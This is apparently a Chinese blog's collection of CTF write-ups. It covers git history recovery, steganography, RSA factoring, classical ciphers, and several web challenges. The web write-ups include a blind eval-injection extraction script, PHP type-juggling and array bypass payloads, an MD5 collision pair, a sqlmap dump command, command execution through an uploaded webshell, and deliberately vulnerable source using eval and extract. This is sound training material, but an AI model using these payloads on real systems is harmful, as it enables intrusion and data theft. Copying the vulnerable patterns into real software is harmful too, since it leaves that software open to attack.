其实就是那个md5解密，这些都是虚的 金融业网络安全攻防比赛热身赛babygit0x01123456789101112threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ git logcommit 96bc79270bdd8ff7858e73eb77d73a2bf93aa085 (HEAD -&gt; master)Author: Admin &lt;admin@example.com&gt;Date: Wed Jul 25 06:16:26 2018 +0000 add messagecommit bb0c97ee3c3e08403ce50391d1ae110ce6d6d41cAuthor: Admin &lt;admin@example.com&gt;Date: Wed Jul 25 06:16:26 2018 +0000 add flag 0x02123threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ git reset bb0c97ee3c3e08403ce50391d1ae110ce6d6d41c重置后取消暂存的变更：D flag.txt 0x0312345threst@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ git checkout flag.txtthrest@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ ls50x.html flag.txt index.html README.mdthrest@kali:~/pentest/GitHack/dist/54.223.83.192_9998$ cat flag.txtflag&#123;G1t_D1s?1&#125; calculate源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798&lt;link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css\"&gt;&lt;center&gt;&lt;title&gt;Calculate&lt;/title&gt;&lt;h1&gt;Calculate&lt;/h1&gt;&lt;form&gt;&lt;input class=\"form-control col-md-4\" type=text name=t placeholder='Input your team token' /&gt;&lt;input class=\"form-control col-md-4\" type=text name=value1 placeholder='Value 1 (Example: 1 abc)' /&gt;&lt;input class=\"form-control col-md-4\" type=text name=op placeholder='Operator (Example: + - * ** / // == != )' /&gt;&lt;input class=\"form-control col-md-4\" type=text name=value2 placeholder='Value 2 (Example: 1 abc)' /&gt;&lt;input class=\"form-control col-md-4 btn btn-success\" type=submit value=EVAL /&gt;&lt;/form&gt;&lt;a href='?source=1'&gt;Source&lt;/a&gt;&lt;/center&gt;&lt;pre&gt;#!/usr/bin/env python3import cgi;import sysfrom html import escapefrom secret import get_flagOK_200 = &amp;quot;&amp;quot;&amp;quot;Content-type: text/html&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&amp;quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;title&amp;gt;Calculate&amp;lt;/title&amp;gt;&amp;lt;h1&amp;gt;Calculate&amp;lt;/h1&amp;gt;&amp;lt;form&amp;gt;&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=t placeholder=&amp;#x27;Input your team token&amp;#x27; %s /&amp;gt;&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value1 placeholder=&amp;#x27;Value 1 (Example: 1 abc)&amp;#x27; /&amp;gt;&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=op placeholder=&amp;#x27;Operator (Example: + - * ** / // == != )&amp;#x27; /&amp;gt;&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value2 placeholder=&amp;#x27;Value 2 (Example: 1 abc)&amp;#x27; /&amp;gt;&amp;lt;input class=&amp;quot;form-control col-md-4 btn btn-success&amp;quot; type=submit value=EVAL /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;a href=&amp;#x27;?%ssource=1&amp;#x27;&amp;gt;Source&amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;&amp;quot;&amp;quot;&amp;quot;arguments = cgi.FieldStorage()if &amp;#x27;t&amp;#x27; in arguments: token = str(arguments[&amp;#x27;t&amp;#x27;].value) print(OK_200 % (&amp;quot;value=&amp;quot;+token+&amp;#x27; readonly&amp;#x27;, &amp;quot;t=&amp;quot;+token+&amp;quot;&amp;amp;&amp;quot;))else: print(OK_200 % (&amp;quot;&amp;quot;, &amp;quot;&amp;quot;))if &amp;#x27;source&amp;#x27; in arguments: source = arguments[&amp;#x27;source&amp;#x27;].valueelse: source = 0if source == &amp;#x27;1&amp;#x27;: print(&amp;#x27;&amp;lt;pre&amp;gt;&amp;#x27;+escape(str(open(__file__,&amp;#x27;r&amp;#x27;).read()))+&amp;#x27;&amp;lt;/pre&amp;gt;&amp;#x27;)if &amp;#x27;value1&amp;#x27; in arguments and &amp;#x27;value2&amp;#x27; in arguments and &amp;#x27;op&amp;#x27; in arguments and &amp;#x27;t&amp;#x27; in arguments: FLAG = &amp;#x27;flag&#123;&amp;#x27; + get_flag(arguments[&amp;#x27;t&amp;#x27;].value) + &amp;#x27;&#125;&amp;#x27; def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [&amp;#x27;(&amp;#x27;,&amp;#x27;)&amp;#x27;,&amp;#x27;[&amp;#x27;,&amp;#x27;]&amp;#x27;,&amp;#x27;\\&amp;#x27;&amp;#x27;,&amp;#x27;&amp;quot;&amp;#x27;] # I don&amp;#x27;t like tuple, list and dict. if val == &amp;#x27;&amp;#x27; or [c for c in blacklist if c in val] != []: print(&amp;#x27;&amp;lt;center&amp;gt;Invalid value&amp;lt;/center&amp;gt;&amp;#x27;) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [&amp;#x27;+&amp;#x27;,&amp;#x27;-&amp;#x27;,&amp;#x27;/&amp;#x27;,&amp;#x27;*&amp;#x27;,&amp;#x27;=&amp;#x27;,&amp;#x27;!&amp;#x27;] if val == &amp;#x27;&amp;#x27; or val[0] not in list_ops: print(&amp;#x27;&amp;lt;center&amp;gt;Invalid op&amp;lt;/center&amp;gt;&amp;#x27;) sys.exit(0) return val op = get_op(arguments[&amp;#x27;op&amp;#x27;].value) value1 = get_value(arguments[&amp;#x27;value1&amp;#x27;].value) value2 = get_value(arguments[&amp;#x27;value2&amp;#x27;].value) if str(value1).isdigit() ^ str(value2).isdigit(): print(&amp;#x27;&amp;lt;center&amp;gt;Types of the values don\\&amp;#x27;t match&amp;lt;/center&amp;gt;&amp;#x27;) sys.exit(0) calc_eval = str(repr(value1)) + str(op) + str(repr(value2)) print(&amp;#x27;&amp;lt;div class=container&amp;gt;&amp;lt;div class=row&amp;gt;&amp;lt;div class=col-md-2&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div class=&amp;quot;col-md-8&amp;quot;&amp;gt;&amp;lt;pre&amp;gt;&amp;#x27;) print(&amp;#x27;&amp;gt;&amp;gt;&amp;gt;&amp;gt; print(&amp;#x27;+escape(calc_eval)+&amp;#x27;)&amp;#x27;) try: result = str(eval(calc_eval)) if result.isdigit() or result == &amp;#x27;True&amp;#x27; or result == &amp;#x27;False&amp;#x27;: print(result) else: print(&amp;quot;Invalid&amp;quot;) # Sorry we don&amp;#x27;t support output as a string due to security issue. except: print(&amp;quot;Invalid&amp;quot;) print(&amp;#x27;&amp;gt;&amp;gt;&amp;gt; &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#x27;)&lt;/pre&gt; writeup1234567891011121314151617181920212223242526272829303132333435363738import requests, redef calc(v1, v2, op, s): u = \"http://54.223.83.192:8888/cgi-bin/calculate.py?\" payload = dict(value1=v1, value2=v2, op=op, source=s,t=hh) #print payload r = requests.get(u, params=payload) #print r.url res = re.findall(\"&lt;pre&gt;\\n&gt;&gt;&gt;&gt;([\\s\\S]*)\\n&gt;&gt;&gt; &lt;\\/pre&gt;\", r.content)[0].split('\\n')[1] assert (res != 'Invalid') return res == 'True' # print r.contentdef check(mid): s = flag + chr(mid) return calc(v1, v2, op, s)def bin_search(seq=xrange(0x20, 0x80), lo=0, hi=None): assert (lo &gt;= 0) if hi == None: hi = len(seq) while lo &lt; hi: mid = (lo + hi) // 2 # print lo, mid, hi, \"\\t\", if check(seq[mid]): hi = mid else: lo = mid + 1 return seq[lo]flag = ''v1, v2, op, s ,hh= 'x', \"+FLAG&lt;value1+source#\", \"+'\", '',\"1a69aa60224a7095ececda5c7c6834fc\"while (1): flag += chr(bin_search() - 1) print flag 参考：https://xz.aliyun.com/t/2456 网鼎杯wp套娃打开文件看见很多图片,首先判断lsb,用工具zsteg,一张一张试，试到第六张zsteg 6.png出flag1234567imagedata .. text: &quot;-+,554$&amp;&amp;&quot;b1,rgb,lsb,xy .. text: &quot;^;lI;bN$&quot;b1,bgr,lsb,xy .. text: &quot;+flag&#123;03a253f5-8e93-4533-bcfc-af908830095d&#125;\\nq&quot;b2,b,msb,xy .. file: Encore - version 8432b4,r,lsb,xy .. text: &quot;iEsx\\&quot;gwN)&quot;b4,g,lsb,xy .. text: &quot;yEsx\\&quot;gwN)&quot;b4,b,msb,xy .. text: &quot;&#123;OL?i9Ww&quot; babyrsa首先求出q,p12345678910111213141516171819202122232425262728293031323334import randomdef gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return adef getpq(n,e,d): p = 1 q = 1 while p==1 and q==1: k = d * e - 1 g = random.randint ( 0 , n ) while p==1 and q==1 and k % 2 == 0: k /= 2 y = pow(g,k,n) if y!=1 and gcd(y-1,n)&gt;1: p = gcd(y-1,n) q = n/p return p,qdef main(): n =365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357 e = 65537 d = 171667543985758425014232627985840717336387122108163758500542139626729279212540485673813409388397427405892256280730752710530037468765259171638824687119216443453078833931370749271396524300663719786871097595637432285751800013612137436020725492852419342272435212733486026753609513054804440530485467017884797272879406284689903095072725307517165288748564887361729738358011463377509622604034612759898436024272853796444439505507110804160400608180412245257162062494766079887998276493727771202445125297118556385657613871902180087388189988280105656191733965985878495407148701887047735812018200868151321246119065258205755102189932618492331181731032930671506379119003614308043854723142913145153824556828017544028126772950732350030371733003652817854070184981540813302478821473998511699291112000260313162924676245915026226201977284465842505256191235822318812659628683043195357384607192367037650400361829016395922074065034014120534209020328864830006606839179592932609256661738193663329776230050481312159600570791315455079679469956882283489829258240404557309270261381865785081719442470884775430068193960751589033994677379472095235901602941733635505402949964622214247924792042997962235246007680923289071880896909708764598890244005005286926994431628289 p,q = getpq(n,e,d) print hex(p),hex(q)if __name__ == '__main__': main() 然后将enc保存起来为en文件123456789101112import gmpy2import rsaimport base64n = 365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357q = 21247215740957134093265550307601596334565934182288901633479787419858595507309542143291010899116196305518233534420568241312971809880837699847400521241640799368655041150575554308730271881769239094444859039192040949365669348829967204647597799647400611871600471392643211141324508902013965629910849583588860496396894218207070653018491227851599590460886901861118814380124225957234489558977546955544744088926474539812805322440263336981775000388601318263891815294818558967365443417213622344902893006222500539208416032217024199412011407065597780149434489493090516057515224711817526865207811206081845018578244352022299726352429p = 17218660277747658661570321204242764803630206984608091050735513899954607259990197682920217962729554631925287717895042750367376053893825222669682720379767777978420372647078471394057423219108293122309702127813213538098587207320396013417905225613995163882055903136983578393368677405597005083234898687252223168153402377438770956193242614092327835450469896527227274247481162714635222596608814392174415700802919488373733075163465872659516094599061925501245246745540660613671330140533678955280470168225630164182057506377339944396256899408381867150087697255700045339651723565686838745271371156317781031620433061297464511939833e = 65537d = int(gmpy2.invert(e,(p-1)*(q-1)))c = 595907910014897566676759273220494180110504405309206928262077375196851872198255475894354731091152236001815566589109149418500941957601976338444865345923284445575231525767013366811625019790193104404700935059348406110259409132999154793422284855871479573037198863168316139619015230842153164456415165712733168847053549666987429231550045602429647190887296150436097504253951033086041023290243394588112378415597355331197477353268041702315544498517593435582803377846605416492328428549762726997373778610297631262936044023082133389527010183648204602019909093544050106545010340111158865651714595416550877266379460461202508425081538939755155981052462387069127219471271252329219741973931444515475042747296537826297597609877185091023146800772255931184176842795811493106605043628420424570356086529035683658247137732622727936360278626896359520245649007121507751791963774871011757969835056581831379451191486773951068884218824708768124265822406883125206366165049254095060850508149142077001002691653724105471247840338330950732651135526020758912039445132132220384552395727000975811496722746325764235912590648009260905626046623587310131509221213855320504560598181447448347942432104726593025899197575968063366667049857458434444589861188997071804152577554008432377364384618217386050104523193905875708680446628674323881765587061198043253617150813946435891423000351453751011920626958050766691194569988935791651947014346084202733308461380228052483711867634858130530821103064974133728497007084932069068016812055942718671316269862791929104093268433719717198448532384887239504852113742140342891243245503616771575963935904547388496016245046067614357190925132118951805544371988522892491794366705168091658privatekey = rsa.PrivateKey(n,e,d,p,q)with open(\"en\",\"r\") as f: print(rsa.decrypt(base64.b64decode(f.read()),privatekey).decode()) 得到flagflag{w3lC0M3_t0_rS4_w0RlD} 安恒_奇怪的恐龙特性http://101.71.29.5:100091234567891011121314151617181920 &lt;?phphighlight_file(__FILE__);ini_set(\"display_error\", false);error_reporting(0);$str = isset($_GET['A_A'])?$_GET['A_A']:'A_A';if (strpos($_SERVER['QUERY_STRING'], \"A_A\") !==false) &#123; echo 'A_A,have fun';&#125;elseif ($str&lt;9999999999) &#123; echo 'A_A,too small';&#125;elseif ((string)$str&gt;0) &#123; echo 'A_A,too big';&#125;else&#123; echo file_get_contents('flag.php');&#125;?&gt; A_A,too small 知识点123456http://localhost/aaa/?p=222 (附带查询)结果：$_SERVER[&apos;QUERY_STRING&apos;] = &quot;p=222&quot;;$_SERVER[&apos;REQUEST_URI&apos;] = &quot;/aaa/?p=222&quot;;$_SERVER[&apos;SCRIPT_NAME&apos;] = &quot;/aaa/index.php&quot;;$_SERVER[&apos;PHP_SELF&apos;] = &quot;/aaa/index.php&quot;; 简单点解释就是当代码中存在$_REQUEST[&#39;user_id&#39;]里面类似的参数的时候，我们在url上可以这样a.php?user.id传参去进行绕过,这样进去之后也能表示$_REQUEST[&#39;user_id&#39;]的值，同样可以绕过的符号还有+，[ 等，应该说是php的一个小特性，上面讲的很清楚了， payload：http://101.71.29.5:10007/?A+A[]=admin loli想到使用0xFF异或整个文件，脚本如下：1234567891011#!/usr/bin/env python# coding=utf-8def xor(): with open('./1.png', 'rb') as f, open('xor.png', 'wb') as wf: for each in f.read(): wf.write(chr(ord(each) ^ 0xff))if __name__ == '__main__': xor() play fair加密(关键字公平)http://www.practicalcryptography.com/ciphers/classical-era/playfair/ 例题 vv公司称，他们给出了最为公平的游戏规则，你能猜到是什么吗？ 规则：FMGKYBXTSFBNCQDSPT，附件：ZKLIPOAGSUMDWFHCBVTRYENXQ. 答案的格式是key{xxxxx}，xxx为解密内容大写，所以答案是 1234# python3# 在所在pycipher模块下导入&gt;&gt;&gt; from pycipher import Playfair &gt;&gt;&gt; Playfair(&apos;ZKLIPOAGSUMDWFHCBVTRYENXQ&apos;).decipher(&apos;FMGKYBXTSFBNCQDSPT&apos;) &apos;WHALECTFISVERYFAIR&apos; rfc4042utf-9编码123456789# python2import utf9f1 = open(&apos;flag_is_here_rfc4042&apos;,&apos;r&apos;)f2 = open(&apos;flag.txt&apos;,&apos;w&apos;)str1 = f1.read()print utf9.utf9decode(str1)f2.write(utf9.utf9decode(str1))f1.close()f2.close() 得到1_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___ 使用脚本解密1234567891011121314# python2import binascii_ = 1__ = 2___ = 3____ = 4_____ = 5______ = 6_______ = 7________ = 8_________ = 9f = open('flag.txt','r')a = f.read()print a 得到一串数字5287002131074331513转换成16进制为495f346d2d6b3379转换成字符串就是最后的flagI_4m-k3y python中16进制转ascii代码1234567# -*- coding: utf-8 -*-import binascii#16进制整数转ASCii编码字符串a = 0x665554b = hex(a) #转换成相同的字符串即'0x665554'b = b[2:] #截取掉'0x'c = binascii.a2b_hex(b) #转换成ASCii编码的字符串 这里我们使用1234In [2]: import binasciiIn [3]: a = &apos;495f346d2d6b3379&apos;In [4]: print(binascii.a2b_hex(a))I_4m-k3y ASCii编码字符串转十六进制整数123456789# -*- coding: utf-8 -*-import binasciic = 'fUT'e = 0 #暂存结果for i in c: d = ord(i) #单个字符转换成ASCii码 e = e*256 + d #将单个字符转换成的ASCii码相连print(\"e:%x\" %e)print type(e) kill(2016全国大学生信息安全竞赛)12threst@threst:~/下载$ strings kill.pcapng | grep flag=flag&#123;roses_r_blue_violets_r_r3d_mayb3_harambae_is_not_kill&#125; 2018“安恒杯”Web安全测试大赛（秋季预选赛）输入试试http://114.55.36.69:800312345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head lang=\"en\"&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Input&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div align=\"center\"&gt; &lt;input type=\"text\" id=\"flag\" style=\"width: 200px;margin-left: 100px;\" value=\"\" /&gt; &lt;input type=\"button\" name=\"\" id=\"\" onclick=\"check();\" value=\"提交\"/&gt;&lt;/div&gt;&lt;/body&gt;&lt;script&gt; function check()&#123; var flag = document.getElementById(\"flag\").value; var str = \"d84d9657e5e5e\" || 0; var str = str + (\"ad2ad3fe\" &amp;&amp; 2); var str = str + \"a2da9494b8\" + \"ddea4fd4\"; var str = str.split(\"\").reverse().join(\"\"); if (str == flag)&#123; alert(\"恭喜你已经找到flag！\"); &#125; &#125;&lt;/script&gt;&lt;/html&gt; 直接控制台flag:4df4aedd8b4949ad2a2e5e5e7569d48d 简单的md5简单的md5 http://114.55.36.69:8004 源码:easy MD5 cracking &lt;!--$_POST[&#39;data1&#39;]!=$_POST[&#39;data2&#39;]--&gt;failpayload:data1[]=1&amp;data2[]=2flag{401cf19d304e557349fecda18110c138} 传个flag试试http://114.55.36.69:8012 随便ｐｏｓｔ一个ｆｌａｇ参数，提示要１０位以上，提交十位以上直接出答案 flag{858a14671c27804b63e6e96b0acdfdd7} md5 crashhttp://114.55.36.69:8006 源码1MD5 cracking&lt;!-- if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;]))--&gt;fail payload:data1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;data2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 flag:flag{9bd1ee7355b58e53214adb9a37b4cb82} 简单的新闻搜索网站http://114.55.36.69:8010 保存请求包12345678910111213POST / HTTP/1.1Host: 114.55.36.69:8010User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://114.55.36.69:8010/Content-Type: application/x-www-form-urlencodedContent-Length: 17Connection: closeUpgrade-Insecure-Requests: 1word=123&amp;number=5 paylload:sqlmap -r burp.txt -D news -T admin --dump flag:flag{f98505d1d12f50a0bd9463e90876630} 省赛添加http://www.camser.top/2018/06/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bweb%E7%AF%87/#ezupload http://114.55.36.69:8015/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/test.gif.php?code=cat%20../../dc9d7b225e0a391fb028fb337ffd1c1d/f14g /tmp/upload_td5pr76p91efjs5qcuad4b0q52//tmp/upload_ru3o7d9kqb8a14jp0fc2m4a7u5//tmp/upload_ru3o7d9kqb8a14jp0fc2m4a7u5//tmp/upload_ru3o7d9kqb8a14jp0fc2m4a7u5//tmp/upload_2e5g1d0qainrjqm7se8nv4ife2/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;?phpclass SimpleZip&#123; public $file; public $za; public $debug; function __construct($file, $debug = false)&#123; $this-&gt;file = $file; $this-&gt;debug = $debug; $this-&gt;za = new ZipArchive(); $this-&gt;za-&gt;open($this-&gt;file); if($this-&gt;debug)&#123; echo \"Open file &#123;$this-&gt;file&#125;\\n\"; &#125; &#125; public function iszip()&#123; return ($this-&gt;za-&gt;open($this-&gt;file) === true)?true:false; &#125; public function extract($dir, $exclude = array())&#123; if($this-&gt;iszip() === true)&#123; for($i = 0; $i &lt; $this-&gt;za-&gt;numFiles; $i++) &#123; $filename = $this-&gt;za-&gt;getNameIndex($i); if(in_array(basename($filename), $exclude))&#123; continue; &#125; $pathinfo = pathinfo($filename); if(!file_exists($dir.'/'.$pathinfo['dirname']))&#123; @mkdir($dir.'/'.$pathinfo['dirname'], 0777, true); &#125; if(file_exists($dir.'/'.$pathinfo['dirname']))&#123; copy(\"zip://\".$this-&gt;file.\"#\".$filename, $dir.'/'.$filename); &#125; if($this-&gt;debug)&#123; echo 'Extract: '.$dir.'/'.$filename.\"\\n\"; &#125; &#125; return true; &#125; return false; &#125; public function getFiles()&#123; $list = array(); if($this-&gt;iszip() === true)&#123; for($i = 0; $i &lt; $this-&gt;za-&gt;numFiles; $i++) &#123; $filename = $this-&gt;za-&gt;getNameIndex($i); $list[] = $filename; &#125; &#125; return $list; &#125; public function getContents($filename)&#123; return file_get_contents(\"zip://\".$this-&gt;file.\"#\".$filename); &#125; function __destruct()&#123; $this-&gt;za-&gt;close(); &#125;&#125;function getExt($name)&#123; return strrchr(basename($name), '.');&#125;if(isset($_FILES['file']['name']) &amp;&amp; !$_FILES['file']['error'])&#123; header(\"Content-type: text/plain; charset=utf-8\"); $ext = getExt($_FILES['file']['name']); if($_FILES['file']['size'] &gt; 1024*1024)&#123; die('文件太大了'); &#125; if($ext !== '.zip')&#123; die('文件格式错误'); &#125; if (is_uploaded_file($_FILES['file']['tmp_name'])) &#123; $file = $_FILES['file']['tmp_name']; $sz = new SimpleZip($file); if(!$sz-&gt;iszip())&#123; die('文件格式错误'); &#125; $tmpname = tempnam(sys_get_temp_dir(), 'vs.'); unlink($tmpname); $tmpdir = sys_get_temp_dir().'/'.md5($tmpname); mkdir($tmpdir); if(!file_exists($tmpdir))&#123; die('系统错误1'); &#125; if(!$sz-&gt;extract($tmpdir))&#123; die('系统错误2'); &#125; $files = $sz-&gt;getFiles(); $files_num = 0; foreach($files as $name)&#123; if(!in_array(getExt($name), array('.jpg','.png','.jpeg','.gif')) || strpos($name, '.ph') !== false)&#123; unlink($tmpdir.'/'.$name); continue; &#125; $files_num++; echo \"/upload/\".md5($tmpname).\"/&#123;$name&#125;\\n\"; &#125; if($files_num &gt; 0)&#123; shell_exec(\"mv \".escapeshellarg($tmpdir).\" \".escapeshellarg($_SERVER['DOCUMENT_ROOT'].'/upload/'.md5($tmpname))); &#125;else&#123; rmdir($tmpdir); die('没有图片'); &#125; &#125; exit;&#125;?&gt; md5爆破脚本题目:md5(key)==&quot;5a2a7d385fdaad3fabbe7b11c28bd48e&quot;and the key is ichunqiu[a-z0-9]{5} 12345678910111213141516import hashlibdef md5(data): m = hashlib.md5() m.update(data) a = m.hexdigest() return aa = 'ichunqiu'b = 'abcdefghijklmnopqrstuvwxyz1234567890'for i in b: for j in b: for k in b: for l in b: for m in b: if md5(a+i+j+k+l+m)=='5a2a7d385fdaad3fabbe7b11c28bd48e': print(a+i+j+k+l+m) from 2017.bkctf1234567891011121314&lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; payload:url/?uname[]=1#id=marginpost:passwd[]=2 TXT源题目(from 2017.bkctf) 123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo \"&lt;p&gt;This is flag:\" .\" $flag&lt;/p&gt;\";&#125;else&#123;echo \"&lt;p&gt;sorry!&lt;/p&gt;\";&#125;&#125;?&gt; 方法一：$f = trim(file_get_contents($fn)) 想办法获得一个文本文件fn提取字符串赋值给f.可以在自己的服务器上加个txt内容与ac的get值相等是可以做的…再想出题人不可能让每个做的人去自己服务器写个txt吧…于是在这道题URL框后面加了flag.txt就出现了文本信息“flags”… payload:url/?ac=flag&amp;fn=url/flag.txt 方法二：狐火页面工具，运用php输入流，将fn获得的值设置为post进去的值. payload:url/?ac=123&amp;fn=php://input,post:123 本地包含源题目(from 2017.bkctf)123456&lt;?phpinclude \"flag.php\";$a = @$_REQUEST['hello'];eval( \"var_dump($a);\");show_source(__FILE__);?&gt; 构造：http://post.bugku.com/hello/(起始网址) + ?hello=print_r(file(“flag.php”)). 6.正则？源题目(from 2017.bkctf): 12345678&lt;?phphighlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match(\"/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);if( $IM )&#123;die('key is: '.$key);&#125;?&gt; 明白正则就很简单了，/匹配开始,/key匹配第一个key,.匹配0次或多次的除换行符之外的字符，key再匹配一个key,{4,7}key匹配4次到7次的key,\\/.\\/中，\\为转义字符，即匹配符号//并且之中可匹配除换行符意外的任意字符，(.key)意思与之前相同，[a-z]可匹配a-z的字母，[:punct:]意思为可以匹配符号,/i的意思是不区分大小写。 payload:keykeykeykeykeykeykey:/a/keys[!] https://cloud.tencent.com/developer/article/1038132 2018安恒杯-9月月赛web题目源码12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;35)&#123; die(\"Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9_$]+/\",$code))&#123; die(\"NO.\"); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = \"php function getFlag() to get flag\";?&gt; 根据代码，我们要满足两个条件： 1.长度不能大于40 2.不能包含大小写字母，数字 参考这篇文章文章2,利用linux的特性来读取文件.根据师傅们的尝试/???/??? =&gt; /bin/cat,所以我们来查看下源码，经过尝试发现1234567891011121314151617181920212223```php&lt;?phpfunction getFlag()&#123; $flag = file_get_contents(&apos;/flag&apos;); echo $flag;&#125;&lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&#123; $code = $_GET[&apos;code&apos;]; if(strlen($code)&gt;35)&#123; die(&quot;Long.&quot;); &#125; if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = &quot;php function getFlag() to get flag&quot;;?&gt; 分析只要查看到/flag就可以得到flag,所以payload为123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172注意这些`?&gt;`是为了闭合前面的语句，在重新添加一句ｐｈｐ的语句来执行命令## 粗心的程序员呀(2018安恒8月赛)&gt;考点：Flask debug 